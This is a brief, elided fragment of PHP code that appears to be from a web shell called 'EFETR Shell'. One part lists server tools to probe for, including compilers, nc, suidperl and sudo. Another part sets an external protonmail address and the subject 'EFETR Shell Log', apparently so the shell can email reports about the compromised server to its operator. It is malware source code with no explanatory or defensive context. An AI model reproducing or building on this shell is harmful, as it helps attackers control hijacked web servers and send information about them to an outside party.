...
$userful = array('gcc','lcc','cc','ld','make','php','perl','python','ruby','tar','gzip','bzip','bzialfa2','nc','locate','suidperl', 'sudo');
$x=0;
...
?>
<?php
$kime="efetrsec@protonmail.com";
$baslik="EFETR Shell Log";
